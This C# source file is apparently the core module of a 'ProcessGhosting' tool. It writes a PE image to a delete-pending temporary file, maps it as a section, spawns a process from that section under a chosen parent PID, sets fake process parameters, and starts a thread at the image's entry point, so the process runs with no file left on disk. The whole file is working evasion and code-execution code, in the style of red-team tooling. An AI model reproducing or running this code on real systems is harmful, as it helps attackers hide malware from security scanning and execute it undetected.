using System;
using System.IO;
using ProcessGhosting.Interop;

namespace ProcessGhosting.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateGhostingProcess(
            byte[] imageData,
            string commandLine,
            int ppid,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            IntPtr hSection;
            IntPtr pPeb;
            IntPtr pImageBase;
            IntPtr pRemoteEntryPoint;
            IntPtr pRemoteProcessParameters;
            uint nEntryPointOffset;
            string imagePathName;
            PeFile.IMAGE_FILE_MACHINE archImage;
            bool is64BitImage;
            bool status = false;
            string tempFilePath = Path.GetTempFileName();
            var hGhostingProcess = IntPtr.Zero;

            if (Environment.Is64BitOperatingSystem && (IntPtr.Size != 8))
            {
                Console.WriteLine("[!] In 64bit OS, should be built as 64bit binary.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem && (IntPtr.Size != 4))
            {
                Console.WriteLine("[!] In 32bit OS, should be built as 32bit binary.");

                return false;
            }

            Console.WriteLine("[>] Loading image data.");

            try
            {
                using (var peImage = new PeFile(imageData))
                {
                    nEntryPointOffset = peImage.GetAddressOfEntryPoint();
                    archImage = peImage.Architecture;
                    is64BitImage = peImage.Is64Bit;
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to load image data.");

                return false;
            }

            Console.WriteLine("[+] Image data is loaded successfully.");
            Console.WriteLine("    [*] Architecture : {0}", archImage.ToString());

            if (Environment.Is64BitOperatingSystem && !is64BitImage)
            {
                Console.WriteLine("[-] Should be x64 PE data in 64bit OS.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem && is64BitImage)
            {
                Console.WriteLine("[-] Should be x86 PE data in 32bit OS.");

                return false;
            }

            Console.WriteLine("[>] Trying to resolve image file path.");

            imagePathName = Helpers.ResolveImagePathName(commandLine);

            if (string.IsNullOrEmpty(imagePathName))
            {
                Console.WriteLine("[-] Failed to resolve target image path.");

                return false;
            }
            else
            {
                Console.WriteLine("[+] Image file is resolved successfully.");
                Console.WriteLine("    [*] Image File Path : {0}", imagePathName);
            }

            do
            {
                Console.WriteLine("[>] Trying to create delete pending file.");

                hSection = Utilities.CreateDeletePendingFileSection(tempFilePath, imageData);

                if (hSection == Win32Consts.INVALID_HANDLE_VALUE)
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Delete pending file is created successfully.");
                    Console.WriteLine("    [*] File Path      : {0}", tempFilePath);
                    Console.WriteLine("    [*] Section Handle : 0x{0}", hSection.ToString("X"));
                }

                Console.WriteLine("[>] Trying to create ghosting process.");

                hGhostingProcess = Utilities.CreateGhostingProcess(hSection, ppid);

                if (hGhostingProcess == IntPtr.Zero)
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Ghosting process is create successfully.");
                    Console.WriteLine("    [*] Process Handle : 0x{0}", hGhostingProcess.ToString("X"));
                }

                Console.WriteLine("[>] Trying to get ntdll!_PEB address for the ghosting process.");

                if (!Helpers.GetProcessBasicInformation(
                    hGhostingProcess,
                    out PROCESS_BASIC_INFORMATION pbi))
                {
                    Console.WriteLine("[-] Failed to get ntdll!_PEB address for the ghosting process.");
                    break;
                }
                else
                {
                    pPeb = pbi.PebBaseAddress;
                    Console.WriteLine("[+] Got ghosting process basic information.");
                    Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                    Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
                }

                Console.WriteLine("[>] Trying to get image base address for the ghosting process.");

                pImageBase = Helpers.GetImageBaseAddress(hGhostingProcess, pPeb);

                if (pImageBase == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get image base address for the ghosting process.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got image base address for the ghosting process.");
                    Console.WriteLine("    [*] Image Base Address : 0x{0}", pImageBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));

                    if (Environment.Is64BitProcess)
                        pRemoteEntryPoint = new IntPtr(pImageBase.ToInt64() + nEntryPointOffset);
                    else
                        pRemoteEntryPoint = new IntPtr(pImageBase.ToInt32() + nEntryPointOffset);
                }

                Console.WriteLine("[>] Trying to set process parameters to the ghosting process.");

                pRemoteProcessParameters = Utilities.SetProcessParameters(
                    hGhostingProcess,
                    imagePathName,
                    commandLine,
                    Environment.CurrentDirectory,
                    windowTitle);

                if (pRemoteProcessParameters == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to set process parameters.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Process parameters are set successfully.");
                }

                Console.WriteLine("[>] Trying to start ghosting process thread.");

                ntstatus = NativeMethods.NtCreateThreadEx(
                    out IntPtr hThread,
                    ACCESS_MASK.THREAD_ALL_ACCESS,
                    IntPtr.Zero,
                    hGhostingProcess,
                    pRemoteEntryPoint,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to create thread.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
                else
                {
                    Console.WriteLine("[+] Thread is resumed successfully.");
                    NativeMethods.NtClose(hThread);
                }
            } while (false);

            if (hGhostingProcess != IntPtr.Zero)
            {
                if (!status)
                    NativeMethods.NtTerminateProcess(hGhostingProcess, Win32Consts.STATUS_SUCCESS);

                NativeMethods.NtClose(hGhostingProcess);
            }

            try
            {
                if (File.Exists(tempFilePath))
                    File.Delete(tempFilePath);
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
            }

            return status;
        }
    }
}
